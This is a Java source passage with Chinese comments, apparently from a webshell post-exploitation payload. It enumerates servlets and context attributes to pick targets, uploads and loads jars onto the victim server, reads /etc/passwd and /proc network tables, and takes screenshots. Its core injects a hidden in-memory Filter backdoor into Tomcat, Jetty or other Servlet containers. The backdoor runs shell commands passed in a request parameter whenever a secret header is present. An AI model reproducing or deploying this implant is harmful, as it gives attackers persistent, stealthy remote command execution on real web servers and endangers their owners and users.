        if ("pgsql".equals(type) || "postgresql".equals(type) || "postgres".equals(type)) {
            return new String[]{"org.postgresql.Driver"};
        }
        if ("sqlite".equals(type) || "sqlite3".equals(type)) {
            return new String[]{"org.sqlite.JDBC"};
        }
        if ("sqlserver".equals(type) || "mssql".equals(type)) {
            return new String[]{"com.microsoft.sqlserver.jdbc.SQLServerDriver"};
        }
        if ("oracle".equals(type) || "ora".equals(type)) {
            return new String[]{"oracle.jdbc.OracleDriver", "oracle.jdbc.driver.OracleDriver"};
        }
        return new String[]{"com.mysql.cj.jdbc.Driver", "com.mysql.jdbc.Driver", "org.mariadb.jdbc.Driver"};
    }

    private static String jdbcURL(String type, String host, String port, String dbname) {
        String h = host == null || host.length() == 0 ? "127.0.0.1" : host;
        String p = port == null ? "" : port.trim();
        String d = dbname == null ? "" : dbname;
        if ("sqlite".equals(type) || "sqlite3".equals(type)) {
            return "jdbc:sqlite:" + d;
        }
        if ("pgsql".equals(type) || "postgresql".equals(type) || "postgres".equals(type)) {
            return "jdbc:postgresql://" + h + ":" + (p.length() == 0 ? "5432" : p) + "/" + d;
        }
        if ("sqlserver".equals(type) || "mssql".equals(type)) {
            return "jdbc:sqlserver://" + h + (p.length() == 0 ? "" : ":" + p) + ";databaseName=" + d;
        }
        if ("oracle".equals(type) || "ora".equals(type)) {
            return "jdbc:oracle:thin:@" + h + ":" + (p.length() == 0 ? "1521" : p) + ":" + d;
        }
        // MySQL 默认带超时参数：目标到库这段网络经常是半通，没有超时会一直挂着
        return "jdbc:mysql://" + h + ":" + (p.length() == 0 ? "3306" : p) + "/" + d
                + "?useUnicode=true&characterEncoding=utf8&connectTimeout=8000&socketTimeout=20000";
    }

    /** /proc/net/tcp 的地址是小端 hex：0100007F:1F90 → 127.0.0.1:8080。 */
    private static String hexAddr(String s) {
        if (s == null) {
            return "";
        }
        int c = s.indexOf(':');
        if (c < 0) {
            return s;
        }
        String a = s.substring(0, c);
        int port = 0;
        try {
            port = Integer.parseInt(s.substring(c + 1), 16);
        } catch (Throwable ignored) {
            // 端口解析失败就是 0
        }
        String ip;
        if (a.length() == 8) {
            ip = ipv4(a);
        } else if (a.length() == 32) {
            if (a.startsWith("0000000000000000FFFF0000")) {
                ip = "::ffff:" + ipv4(a.substring(24));
            } else {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 32; i += 8) {
                    if (i > 0) {
                        sb.append(':');
                    }
                    String w = a.substring(i, i + 8);
                    sb.append(w.substring(6, 8)).append(w.substring(4, 6))
                            .append(w.substring(2, 4)).append(w.substring(0, 2));
                }
                ip = sb.toString();
            }
        } else {
            ip = a;
        }
        return ip + ":" + port;
    }

    private static String ipv4(String leHex) {
        long v;
        try {
            v = Long.parseLong(leHex, 16);
        } catch (Throwable t) {
            return leHex;
        }
        // 小端读：最低字节是第一段，0100007F → 127.0.0.1
        return (v & 0xff) + "." + ((v >> 8) & 0xff) + "."
                + ((v >> 16) & 0xff) + "." + ((v >> 24) & 0xff);
    }

    // ---------- Servlet / Filter 枚举（Servlet 3.0 标准 API，跨容器） ----------

    /**
     * 枚举 Servlet/Filter 注册与映射。
     *
     * <p>只用 Servlet 3.0 的 {@code getServletRegistrations/getFilterRegistrations}，
     * 不碰容器内部类，所以 Tomcat/Jetty/Undertow 一套代码通用。拿到的类名/映射是
     * 「下一步打哪」的关键：能直接看出有没有暴露的管理 Servlet、过滤器链顺序，
     * 以及内存马插进去之后是否真的登记上了。
     */
    private static String servletList() {
        StringBuilder sb = new StringBuilder("{\"context\":{\"path\":");
        sb.append(json(sApp == null ? "" : str(safeCall(sApp, "getContextPath"))));
        sb.append(",\"server\":").append(json(sApp == null ? "" : str(safeCall(sApp, "getServerInfo"))));
        sb.append(",\"api\":").append(json(servletApi()));
        sb.append(",\"available\":").append(sApp != null);
        sb.append("},\"servlets\":");
        sb.append(registrations(sApp == null ? null : safeCall(sApp, "getServletRegistrations"), false));
        sb.append(",\"filters\":");
        sb.append(registrations(sApp == null ? null : safeCall(sApp, "getFilterRegistrations"), true));
        sb.append(",\"attributes\":").append(contextAttrs());
        sb.append('}');
        return sb.toString();
    }

    /** 把 Map&lt;String, ServletRegistration|FilterRegistration&gt; 摊平成数组。 */
    private static String registrations(Object map, boolean filter) {
        StringBuilder sb = new StringBuilder("[");
        int n = 0;
        if (map instanceof java.util.Map) {
            java.util.Iterator it = ((java.util.Map) map).entrySet().iterator();
            while (it.hasNext()) {
                java.util.Map.Entry e = (java.util.Map.Entry) it.next();
                Object reg = e.getValue();
                if (n++ > 0) {
                    sb.append(',');
                }
                sb.append("{\"name\":").append(json(str(e.getKey())));
                sb.append(",\"class\":").append(json(str(safeCall(reg, "getClassName"))));
                if (filter) {
                    sb.append(",\"patterns\":").append(json(join(safeCall(reg, "getUrlPatterns"))));
                    sb.append(",\"async\":").append(json(str(safeCall(reg, "getAsyncSupported"))));
                } else {
                    sb.append(",\"mappings\":").append(json(join(safeCall(reg, "getMappings"))));
                    sb.append(",\"load_on_startup\":").append(json(str(safeCall(reg, "getLoadOnStartup"))));
                }
                sb.append('}');
            }
        }
        return sb.append(']').toString();
    }

    /**
     * ServletContext 属性名 + 值的类型名。
     *
     * <p>只给类型不给 toString：属性里常有连接池/数据源这类对象，toString 可能是半页
     * 无关文本甚至敏感串；类型名足够判断「这里挂着什么，值不值得继续挖」。
     */
    private static String contextAttrs() {
        StringBuilder sb = new StringBuilder("{");
        Object names = sApp == null ? null : safeCall(sApp, "getAttributeNames");
        int n = 0;
        if (names instanceof java.util.Enumeration) {
            java.util.Enumeration en = (java.util.Enumeration) names;
            while (en.hasMoreElements() && n < 80) {
                Object k = en.nextElement();
                Object v = safeCall(sApp, "getAttribute", k);
                if (n++ > 0) {
                    sb.append(',');
                }
                sb.append(json(String.valueOf(k))).append(':')
                        .append(json(v == null ? "null" : v.getClass().getName()));
            }
        }
        return sb.append('}').toString();
    }

    // ---------- Jar 动态加载 ----------

    // 装载器挂在 ServletContext 属性上而不是静态字段：载荷类每个请求都会被重新
    // defineClass，上一次请求的静态字段活不到下一次。
    private static final String JAR_ATTR_PREFIX = "forang.jar.";

    /**
     * 上传 jar 到目标机并装载，回报路径与其中的 JDBC 驱动。
     *
     * <p>用途是解决「目标有数据库但容器 classpath 里没有驱动」这个最常见的卡点：
     * 传一个驱动包上来，再把返回的路径填进 db 的 jar 参数即可直连。
     */
    private static String jarLoad(String b64, String savePath) {
        if (b64 == null || b64.trim().length() == 0) {
            return "ERROR:缺少 jar 内容（base64）";
        }
        byte[] bytes;
        try {
            bytes = java.util.Base64.getDecoder().decode(b64.trim());
        } catch (Throwable t) {
            return "ERROR:base64 解码失败：" + str(t.getMessage());
        }
        File f;
        try {
            if (savePath != null && savePath.trim().length() > 0) {
                f = new File(savePath.trim());
                File parent = f.getParentFile();
                if (parent != null && !parent.isDirectory()) {
                    parent.mkdirs();
                }
            } else {
                f = File.createTempFile("forang-", ".jar");
            }
            FileOutputStream fos = new FileOutputStream(f);
            try {
                fos.write(bytes);
            } finally {
                fos.close();
            }
        } catch (Throwable t) {
            return "ERROR:写入 jar 失败：" + t.getClass().getSimpleName() + "：" + str(t.getMessage());
        }

        StringBuilder sb = new StringBuilder("{\"ok\":true");
        sb.append(",\"path\":").append(json(f.getAbsolutePath()));
        sb.append(",\"size\":").append(bytes.length);
        try {
            ClassLoader ucl = loaderFor(f.getAbsolutePath());
            java.util.List names = jarEntries(f);
            sb.append(",\"classes\":").append(names.size());
            sb.append(",\"jdbc_drivers\":").append(json(join(jdbcDrivers(f, ucl, names))));
            sb.append(",\"kept\":").append(sApp != null);
        } catch (Throwable t) {
            sb.append(",\"classes\":0,\"jdbc_drivers\":[],\"kept\":false");
            sb.append(",\"error\":").append(json(t.getClass().getSimpleName() + "：" + str(t.getMessage())));
        }
        // 驱动清单要能让调用方直接照抄进 db 的 jar 参数，所以路径单独给一行可读文本
        sb.append(",\"hint\":").append(json("把 path 填进 db 的 jar 参数即可用这个包里的驱动直连"));
        return sb.append('}').toString();
    }

    /** 列 jar 里的 .class 条目（只列名，不加载，避免静态初始化块在探测阶段跑起来）。 */
    private static java.util.List jarEntries(File f) throws IOException {
        java.util.List names = new ArrayList();
        java.util.jar.JarFile jf = new java.util.jar.JarFile(f);
        try {
            java.util.Enumeration entries = jf.entries();
            while (entries.hasMoreElements() && names.size() < 2000) {
                // 直接转 JarEntry：JarFile$JarFileEntry 是不可见的实现类，用反射调 getName
                // 会被访问检查挡下（返回 null），表现为「jar 里一个 class 都数不出来」。
                java.util.jar.JarEntry e = (java.util.jar.JarEntry) entries.nextElement();
                if (e.getName().endsWith(".class")) {
                    names.add(e.getName());
                }
            }
        } finally {
            jf.close();
        }
        return names;
    }

    /**
     * 找出包里实现 java.sql.Driver 的类。
     *
     * <p>优先读 META-INF/services/java.sql.Driver（JDBC 4 的正式声明），没有再按类名
     * 里带 Driver 的候选逐个验证——只靠命名会漏掉非标准命名的驱动，只靠服务文件则
     * 漏掉老包。
     */
    private static java.util.List jdbcDrivers(File f, ClassLoader ucl, java.util.List entries) {
        java.util.List out = new ArrayList();
        java.util.List cand = new ArrayList();
        try {
            java.util.jar.JarFile jf = new java.util.jar.JarFile(f);
            try {
                java.util.jar.JarEntry e = jf.getJarEntry("META-INF/services/java.sql.Driver");
                if (e != null) {
                    InputStream in = jf.getInputStream(e);
                    try {
                        java.io.BufferedReader br = new java.io.BufferedReader(
                                new java.io.InputStreamReader(in, "UTF-8"));
                        String line;
                        while ((line = br.readLine()) != null) {
                            line = line.trim();
                            if (line.length() > 0 && line.charAt(0) != '#') {
                                cand.add(line);
                            }
                        }
                    } finally {
                        in.close();
                    }
                }
            } finally {
                jf.close();
            }
        } catch (Throwable ignored) {
            // 没有服务文件就走下面的命名启发
        }
        if (cand.isEmpty()) {
            for (int i = 0; i < entries.size(); i++) {
                String nm = String.valueOf(entries.get(i));
                int slash = nm.lastIndexOf('/');
                String simple = slash >= 0 ? nm.substring(slash + 1) : nm;
                if (simple.endsWith("Driver.class")) {
                    cand.add(nm.substring(0, nm.length() - 6).replace('/', '.'));
                }
            }
        }
        for (int i = 0; i < cand.size() && out.size() < 20; i++) {
            String cn = String.valueOf(cand.get(i));
            try {
                Class c = Class.forName(cn, false, ucl);
                if (Driver.class.isAssignableFrom(c)) {
                    out.add(cn);
                }
            } catch (Throwable ignored) {
                // 依赖缺失的类跳过
            }
        }
        return out;
    }

    /**
     * 取（或新建）jar 的装载器，支持逗号/分号分隔的多个包。
     *
     * <p>多包是必需的：驱动包经常互相依赖（例如 sqlite-jdbc 需要 slf4j-api），
     * 一个 URLClassLoader 里同时挂上主包和依赖包才能把驱动类初始化起来。
     * 父加载器用载荷自己的，保证两边共用同一个 java.sql.Driver 接口。
     */
    private static ClassLoader loaderFor(String path) throws Exception {
        String key = JAR_ATTR_PREFIX + path;
        if (sApp != null) {
            Object o = safeCall(sApp, "getAttribute", key);
            if (o instanceof ClassLoader) {
                return (ClassLoader) o;
            }
        }
        String[] parts = path.split("[,;]");
        java.util.List urls = new ArrayList();
        for (int i = 0; i < parts.length; i++) {
            String one = parts[i].trim();
            if (one.length() == 0) {
                continue;
            }
            File f = new File(one);
            if (!f.isFile()) {
                throw new java.io.FileNotFoundException("jar 不存在或不可读: " + one);
            }
            urls.add(f.toURI().toURL());
        }
        if (urls.isEmpty()) {
            throw new java.io.FileNotFoundException("没有可加载的 jar: " + path);
        }
        ClassLoader ucl = new java.net.URLClassLoader(
                (java.net.URL[]) urls.toArray(new java.net.URL[0]),
                Payload.class.getClassLoader());
        if (sApp != null) {
            try {
                call(sApp, "setAttribute", key, ucl);
            } catch (Throwable ignored) {
                // 存不下就每次重建，功能不受影响
            }
        }
        return ucl;
    }

    // ---------- 远程屏幕 ----------

    /**
     * java.awt.Robot 截屏 → PNG base64。
     *
     * <p>服务器上基本是 headless（没有 X/桌面会话），先判 {@code isHeadless} 给一句
     * 明确的「为什么不可用」，别让调用方以为是载荷坏了。
     */
    private static String screenshot() {
        try {
            if (java.awt.GraphicsEnvironment.isHeadless()) {
                return "ERROR:目标 JVM 处于 headless 模式（无图形会话），截屏不可用。"
                        + "服务器场景属正常；需要看页面内容就用 exec 抓取或用文件管理读日志。";
            }
            java.awt.Rectangle rect = new java.awt.Rectangle(
                    java.awt.Toolkit.getDefaultToolkit().getScreenSize());
            java.awt.image.BufferedImage img = new java.awt.Robot().createScreenCapture(rect);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            javax.imageio.ImageIO.write(img, "png", bos);
            return "IMG:" + java.util.Base64.getEncoder().encodeToString(bos.toByteArray());
        } catch (Throwable t) {
            return "ERROR:" + t.getClass().getSimpleName() + "：" + str(t.getMessage());
        }
    }

    // ---------- 插件用的低层工具（不依赖外部命令） ----------

    private static boolean isWS(char c) {
        return c == ' ' || c == '\t' || c == '\n' || c == '\r';
    }

    /** 按空白切分（不用正则：正则对象在受限容器里更容易被安全管理器拦）。 */
    private static String[] splitWS(String line) {
        ArrayList<String> out = new ArrayList<String>();
        int i = 0;
        int n = line.length();
        while (i < n) {
            while (i < n && isWS(line.charAt(i))) {
                i++;
            }
            int s = i;
            while (i < n && !isWS(line.charAt(i))) {
                i++;
            }
            if (i > s) {
                out.add(line.substring(s, i));
            }
        }
        return out.toArray(new String[out.size()]);
    }

    /** /proc/net/tcp 的状态码 → 名字，比给用户看 0A 友好。 */
    private static String stateName(String code) {
        if ("01".equals(code)) {
            return "ESTABLISHED";
        }
        if ("02".equals(code)) {
            return "SYN_SENT";
        }
        if ("03".equals(code)) {
            return "SYN_RECV";
        }
        if ("04".equals(code)) {
            return "FIN_WAIT1";
        }
        if ("05".equals(code)) {
            return "FIN_WAIT2";
        }
        if ("06".equals(code)) {
            return "TIME_WAIT";
        }
        if ("07".equals(code)) {
            return "CLOSE";
        }
        if ("08".equals(code)) {
            return "CLOSE_WAIT";
        }
        if ("09".equals(code)) {
            return "LAST_ACK";
        }
        if ("0A".equals(code)) {
            return "LISTEN";
        }
        if ("0B".equals(code)) {
            return "CLOSING";
        }
        return code == null ? "" : code;
    }

    /** 读小文件转文本，失败一律回空串（/proc 里进程随时可能消失）。 */
    private static String readText(File f, int max) {
        InputStream in = null;
        try {
            in = new FileInputStream(f);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int n;
            while ((n = in.read(buf)) > 0 && out.size() < max) {
                out.write(buf, 0, n);
            }
            return new String(out.toByteArray());
        } catch (Throwable t) {
            return "";
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (Throwable ignored) {
                    // 读 /proc 的关闭失败无需处理
                }
            }
        }
    }

    /** 取 /proc/<pid>/status 里某个键的第一个值（"Uid:" 取真实 uid，忽略 euid/suid）。 */
    private static String statusField(String status, String key) {
        if (status == null || status.length() == 0) {
            return "";
        }
        String[] lines = status.split("\n");
        for (int i = 0; i < lines.length; i++) {
            String l = lines[i];
            if (l.startsWith(key)) {
                String[] f = splitWS(l);
                return f.length > 1 ? f[1] : "";
            }
        }
        return "";
    }

    /** uid → 用户名，省得让人对着 0 猜。 */
    private static Map<String, String> passwd() {
        Map<String, String> m = new TreeMap<String, String>();
        String body = readText(new File("/etc/passwd"), 256 * 1024);
        if (body.length() == 0) {
            return m;
        }
        String[] lines = body.split("\n");
        for (int i = 0; i < lines.length; i++) {
            String[] f = lines[i].split(":");
            if (f.length >= 3) {
                m.put(f[2].trim(), f[0]);
            }
        }
        return m;
    }

    private static boolean digits(String s) {
        if (s == null || s.length() == 0) {
            return false;
        }
        for (int i = 0; i < s.length(); i++) {
            if (s.charAt(i) < '0' || s.charAt(i) > '9') {
                return false;
            }
        }
        return true;
    }

    private static long num(String s) {
        try {
            return Long.parseLong(s.trim());
        } catch (Throwable t) {
            return 0L;
        }
    }

    /** 过滤条件：纯数字按 PID 精确匹配，其余按命令行/进程名模糊匹配；空条件全留。 */
    private static boolean hit(String pid, String text, String filter) {
        if (filter == null) {
            return true;
        }
        String f = filter.trim().toLowerCase();
        if (f.length() == 0) {
            return true;
        }
        if (digits(f)) {
            // 数字只当 PID 用：否则「0」会把命令行里带 0 的进程全捞出来
            return pid != null && pid.equals(f);
        }
        return text != null && text.toLowerCase().indexOf(f) >= 0;
    }

    /** null 安全的字符串化：反射取值常是 null，直接拼会得到 "null"。 */
    private static String str(Object o) {
        return o == null ? "" : String.valueOf(o);
    }

    /** 集合摊平成逗号串（Servlet 的 mappings/patterns 都是 Collection）；非集合原样输出。 */
    private static String join(Object o) {
        if (o == null) {
            return "";
        }
        if (o instanceof java.util.Collection) {
            StringBuilder sb = new StringBuilder();
            java.util.Iterator it = ((java.util.Collection) o).iterator();
            while (it.hasNext()) {
                if (sb.length() > 0) {
                    sb.append(',');
                }
                sb.append(String.valueOf(it.next()));
            }
            return sb.toString();
        }
        return String.valueOf(o);
    }

    private static String clip(String s, int max) {
        if (s == null) {
            return null;
        }
        return s.length() <= max ? s : s.substring(0, max) + "...";
    }

    // ---------- 内存马（Tomcat Filter） ----------
    //
    // 做法：用 java.lang.reflect.Proxy 给容器自己的 Filter 接口生成实现，
    // InvocationHandler 就是本类实例。这样不需要额外 class：
    //   * 不依赖 Nashorn（JDK15 已移除），也不依赖任何编译期 servlet API；
    //   * jakarta / javax 两套接口按 Class.forName 自动选，Tomcat 8/9/10 通用；
    //   * 触发条件走请求头 + 参数，不带门禁的流量照常放行，不容易误伤业务。
    public Object invoke(Object proxy, java.lang.reflect.Method m, Object[] a) throws Throwable {
        String n = m.getName();
        if ("toString".equals(n)) {
            return "forang-filter";
        }
        if ("hashCode".equals(n)) {
            return Integer.valueOf(System.identityHashCode(proxy));
        }
        if ("equals".equals(n)) {
            return Boolean.valueOf(proxy == a[0]);
        }
        if (!"doFilter".equals(n)) {
            return null;
        }
        Object req = a[0];
        Object res = a[1];
        Object chain = a[2];
        try {
            Object hv = call(req, "getHeader", gateHeader);
            if (hv != null && gateValue.equals(String.valueOf(hv))) {
                Object cv = call(req, "getParameter", cmdParam);
                if (cv != null) {
                    String out = execText(String.valueOf(cv));
                    call(res, "setContentType", "text/plain;charset=utf-8");
                    Object w = call(res, "getWriter");
                    call(w, "write", out);
                    call(w, "flush");
                    return null;
                }
            }
        } catch (Throwable ignored) {
            // 门禁判断一旦出错就按普通流量放行，不能把业务打挂
        }
        java.lang.reflect.Method[] ms = chain.getClass().getMethods();
        for (int i = 0; i < ms.length; i++) {
            if ("doFilter".equals(ms[i].getName()) && ms[i].getParameterTypes().length == 2) {
                try {
                    // Jetty 的 ChainEnd 是包私有类：方法本身是 public，但从我们的类加载器
                    // 看不可访问，不 setAccessible 会直接 IllegalAccessException（表现为
                    // 每个非门禁请求 500）。
                    try {
                        ms[i].setAccessible(true);
                    } catch (Throwable ignored) {
                        // 安全管理器禁止时继续试，真不行会在 invoke 时报错
                    }
                    ms[i].invoke(chain, req, res);
                } catch (java.lang.reflect.InvocationTargetException e) {
                    // 反射调用会把下游异常包一层，而 Proxy 又会把「未声明的受检异常」再裹成
                    // UndeclaredThrowableException —— 两层包装后页面上只剩一句无意义的
                    // 500，真实错误（业务为什么炸）就丢了。这里解开，受检异常包成运行时异常。
                    Throwable c = e.getCause() == null ? e : e.getCause();
                    if (c instanceof RuntimeException) {
                        throw (RuntimeException) c;
                    }
                    if (c instanceof Error) {
                        throw (Error) c;
                    }
                    throw new RuntimeException(c);
                }
                break;
            }
        }
        return null;
    }

    /** 探测：容器种类、Servlet API 版本、当前可尝试的注入路径。 */
    private static String msProbe() {
        String kind = containerKind();
        Object ctx = null;
        String reason = "";
        try {
            ctx = stdCtx();
        } catch (Throwable t) {
            reason = t.getClass().getSimpleName() + ": " + t.getMessage();
        }
        StringBuilder sb = new StringBuilder("{");
        sb.append("\"servletApi\":").append(json(servletApi()));
        sb.append(",\"serverInfo\":").append(json(serverInfo()));
        sb.append(",\"container\":").append(json(kind));
        sb.append(",\"contextAvailable\":").append(sApp != null);
        sb.append(",\"strategies\":[");
        String[] st = strategies();
        for (int i = 0; i < st.length; i++) {
            if (i > 0) {
                sb.append(',');
            }
            sb.append(json(st[i]));
        }
        sb.append(']');
        if (ctx != null) {
            sb.append(",\"contextPath\":").append(json(String.valueOf(safeCall(ctx, "getPath"))));
            Object defs = safeCall(ctx, "findFilterDefs");
            sb.append(",\"filterCount\":").append(defs != null && defs.getClass().isArray()
                    ? java.lang.reflect.Array.getLength(defs) : -1);
        } else if (sApp != null) {
            sb.append(",\"reason\":").append(json(reason));
        } else {
            sb.append(",\"reason\":").append(json("载体未注入 ServletContext"));
        }
        // 非 Tomcat/Jetty 没有专用路径：它们的 Filter 链基本在部署期就算好了（Undertow 的
        // addFilter 直接抛 servletContextAlreadyInitialized，Jetty 是 IllegalStateException），
        // servletcontext 这条只在「上下文还没初始化」时才可能成。
        if (!"tomcat".equals(kind) && !"jetty".equals(kind) && sApp != null) {
            sb.append(",\"note\":").append(json("该容器不支持运行期注册 Filter（Undertow/Jetty 已实测被容器拒绝），"
                    + "servletcontext 路径大概率失败；探到的 context 仍可用于读配置/信息收集"));
        }
        return sb.append('}').toString();
    }

    /**
     * 注入 Filter 型内存马：按容器能力挑路径，失败则顺次降级。
     *
     * 三条路径的差别在于「往哪登记、谁负责实例化」：
     *   * tomcat-context：FilterDef + FilterMap + filterConfigs 三处都要塞，
     *     少塞 filterConfigs 首次请求会因为拿不到实例而直接跳过滤镜；
     *   * jetty-handler：ServletHandler 的 filters 列表 + filterMappings，
     *     已启动的 Jetty 会拒绝 addFilter*，只能改列表并手动 start()；
     *   * servletcontext：Servlet 3.0 的 addFilter + addMappingForUrlPatterns，
     *     Undertow / WebLogic / GlassFish 这类容器只认这条路。
     */
    private static String msInject(String name, String gateHeader, String gateValue, String cmdParam) throws Exception {
        if (name == null || name.length() == 0) {
            return "ERROR:缺少 filter 名";
        }
        if (gateHeader == null || gateHeader.length() == 0 || gateValue == null || gateValue.length() == 0) {
            return "ERROR:缺少触发头（gate_header / gate_value）";
        }
        if (sApp == null) {
            return "ERROR:载体未注入 ServletContext：内存马只能在 JSP 上下文内操作";
        }
        String cp = cmdParam == null || cmdParam.length() == 0 ? "cmd" : cmdParam;
        Class<?> fi = filterIface();

        Payload handler = new Payload();
        handler.gateHeader = gateHeader;
        handler.gateValue = gateValue;
        handler.cmdParam = cp;
        Object proxy = java.lang.reflect.Proxy.newProxyInstance(
                fi.getClassLoader(), new Class<?>[]{fi}, handler);

        String[] order = strategies();
        StringBuilder err = new StringBuilder();
        for (int i = 0; i < order.length; i++) {
            try {
                if ("tomcat-context".equals(order[i])) {
                    injectTomcat(name, proxy);
                } else if ("jetty-handler".equals(order[i])) {
                    injectJetty(name, proxy);
                } else {
                    injectGeneric(name, proxy);
                }
                return "OK filter=" + name + " gate=" + gateHeader + ": " + gateValue
                        + " param=" + cp + " url=/* via=" + order[i]
                        + " container=" + containerKind();
            } catch (Throwable t) {
                // 反射 + Proxy 会把真实异常裹两层，只报 InvocationTargetException 等于没说：
                // 真正有用的是最内层的 servletContextAlreadyInitialized 这类原因。
                Throwable c = rootCause(t);
                err.append(order[i]).append(" 失败(").append(c.getClass().getSimpleName());
                if (c.getMessage() != null) {
                    err.append(": ").append(c.getMessage());
                }
                err.append("); ");
            }
        }
        return "ERROR:注入失败（容器 " + containerKind() + "，全部路径均不可用）：" + err;
    }

    /** Tomcat：FilterDef + FilterMap + filterConfigs。 */
    private static void injectTomcat(String name, Object proxy) throws Exception {
        Object ctx = stdCtx();
        Class<?> fdCls = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
        Object fd = fdCls.newInstance();
        call(fd, "setFilterName", name);
        call(fd, "setFilterClass", proxy.getClass().getName());
        call(fd, "setFilter", proxy);
        call(ctx, "addFilterDef", fd);

        Class<?> fmCls = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
        Object fm = fmCls.newInstance();
        call(fm, "setFilterName", name);
        call(fm, "addURLPattern", "/*");
        call(fm, "setDispatcher", "REQUEST");
        call(ctx, "addFilterMapBefore", fm);

        bindTomcatConfig(ctx, name);
    }

    /**
     * 把 FilterDef 变成 filterConfigs 里的实例。
     *
     * Tomcat 用 filterConfigs 缓存已实例化的过滤器：只加 FilterDef/FilterMap 时
     * ApplicationFilterFactory 取不到实例会静默跳过，表现为「注入成功但触发无效」。
     * 这个缓存没有公开的写入接口，只能直接塞 Map（字段名在各版本里稳定）。
     */
    private static void bindTomcatConfig(Object ctx, String name) throws Exception {
        Object fd = call(ctx, "findFilterDef", name);
        if (fd == null) {
            throw new IllegalStateException("filterDef 未登记成功：" + name);
        }
        Class<?> cfgCls = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
        java.lang.reflect.Constructor<?> ctor = cfgCls.getDeclaredConstructor(
                Class.forName("org.apache.catalina.Context"), fd.getClass());
        ctor.setAccessible(true);
        Object cfg = ctor.newInstance(ctx, fd);
        Object map = field(ctx, "filterConfigs");
        if (!(map instanceof java.util.Map)) {
            throw new IllegalStateException("filterConfigs 不是 Map，无法登记实例");
        }
        ((java.util.Map) map).put(name, cfg);
    }

    /**
     * Jetty 9.4~11：ServletHandler 持有 filters 列表与 filterMappings。
     *
     * 先试公开方法 addFilterWithMapping（未启动时可用）；已启动的 Jetty 会对
     * addFilter* 抛 IllegalStateException，此时直接改列表 + 补映射 + 手动 start()，
     * 让容器用当前上下文把 init(FilterConfig) 跑完。
     */
    private static void injectJetty(String name, Object proxy) throws Exception {
        Object handler = jettyServletHandler();
        Class<?> fhCls = hostClass(handler, "org.eclipse.jetty.servlet.FilterHolder",
                "org.eclipse.jetty.ee10.servlet.FilterHolder",
                "org.eclipse.jetty.ee9.servlet.FilterHolder",
                "org.eclipse.jetty.ee8.servlet.FilterHolder");
        Object fh = fhCls.getConstructor(filterIface()).newInstance(proxy);
        call(fh, "setName", name);
        try {
            call(handler, "addFilterWithMapping", fh, "/*", dispatcherSet());
        } catch (Throwable t) {
            // 个别版本在已启动时会拒绝公开方法，退回直接改集合 + 补映射
            java.util.List filters = jettyList(handler, "_filters");
            filters.add(fh);
            storeJettyList(handler, "_filters", filters);
            addJettyMapping(handler, name);
        }
        // 新建的 holder 还没 init：不 start 的话 Jetty 会把它当未就绪的过滤器跳过，
        // 表现为「注入成功、列表里也有，但请求不经过它」。
        Object started = safeCall(fh, "isStarted");
        if (!Boolean.TRUE.equals(started)) {
            call(fh, "start");
        }
    }

    /** 给已存在的 holder 补 /* 映射：FilterMapping 的构造器在 9.4/10/11 之间有差异，两套都试。 */
    private static void addJettyMapping(Object handler, String name) throws Exception {
        Class<?> fmCls = hostClass(handler, "org.eclipse.jetty.servlet.FilterMapping",
                "org.eclipse.jetty.ee10.servlet.FilterMapping",
                "org.eclipse.jetty.ee9.servlet.FilterMapping",
                "org.eclipse.jetty.ee8.servlet.FilterMapping");
        Object fm = null;
        try {
            fm = fmCls.getConstructor(String.class, String.class, java.util.EnumSet.class)
                    .newInstance(name, "/*", dispatcherSet());
        } catch (Throwable ignored) {
            fm = fmCls.newInstance();
            call(fm, "setFilterName", name);
            call(fm, "setPathSpec", "/*");
            call(fm, "setDispatcherTypes", dispatcherSet());
        }
        call(handler, "addFilterMapping", fm);
    }

    /** Servlet 3.0 标准动态注册：addFilter + addMappingForUrlPatterns。 */
    private static void injectGeneric(String name, Object proxy) throws Exception {
        if (servletApi().equals("unknown")) {
            throw new IllegalStateException("目标不是 Servlet 容器（找不到 Filter 接口）");
        }
        Object reg = call(sApp, "addFilter", name, proxy);
        if (reg == null) {
            throw new IllegalStateException("addFilter 返回 null，容器不支持动态注册");
        }
        call(reg, "addMappingForUrlPatterns", null, Boolean.FALSE, new String[]{"/*"});
        // Tomcat 也实现了这条路，但它只登记 FilterDef/FilterMap，实例缓存仍要自己补
        Object ctx = null;
        try {
            ctx = stdCtx();
        } catch (Throwable ignored) {
            // 非 Tomcat：实例化由容器自己负责，到此结束
        }
        if (ctx != null) {
            bindTomcatConfig(ctx, name);
        }
    }

    /** 枚举当前上下文里的 Filter，用于确认注入结果与清理痕迹。 */
    private static String msList() {
        java.util.List<String> items = new java.util.ArrayList<String>();
        String via = "none";
        Object ctx = null;
        try {
            ctx = stdCtx();
        } catch (Throwable ignored) {
            // 非 Tomcat，下面的分支各自找来源
        }
        if (ctx != null) {
            via = "tomcat-context";
            Object defs = safeCall(ctx, "findFilterDefs");
            if (defs != null && defs.getClass().isArray()) {
                int len = java.lang.reflect.Array.getLength(defs);
                for (int i = 0; i < len; i++) {
                    Object d = java.lang.reflect.Array.get(defs, i);
                    items.add("{\"name\":" + json(String.valueOf(safeCall(d, "getFilterName")))
                            + ",\"class\":" + json(String.valueOf(safeCall(d, "getFilterClass"))) + "}");
                }
            }
        } else {
            Object handler = null;
            try {
                handler = jettyServletHandler();
            } catch (Throwable ignored) {
                // 不是 Jetty
            }
            if (handler != null) {
                via = "jetty-handler";
                java.util.List filters = null;
                try {
                    filters = jettyList(handler, "_filters");
                } catch (Throwable ignored) {
                    filters = null;
                }
                if (filters != null) {
                    for (int i = 0; i < filters.size(); i++) {
                        Object fh = filters.get(i);
                        items.add("{\"name\":" + json(String.valueOf(safeCall(fh, "getName")))
                                + ",\"class\":" + json(String.valueOf(safeCall(fh, "getClassName"))) + "}");
                    }
                }
            } else if (sApp != null) {
                Object regs = safeCall(sApp, "getFilterRegistrations");
                if (regs instanceof java.util.Map) {
                    via = "servletcontext";
                    java.util.Iterator it = ((java.util.Map) regs).values().iterator();
                    while (it.hasNext()) {
                        Object r = it.next();
                        items.add("{\"name\":" + json(String.valueOf(safeCall(r, "getName")))
                                + ",\"class\":" + json(String.valueOf(safeCall(r, "getClassName"))) + "}");
                    }
                }
            }
        }
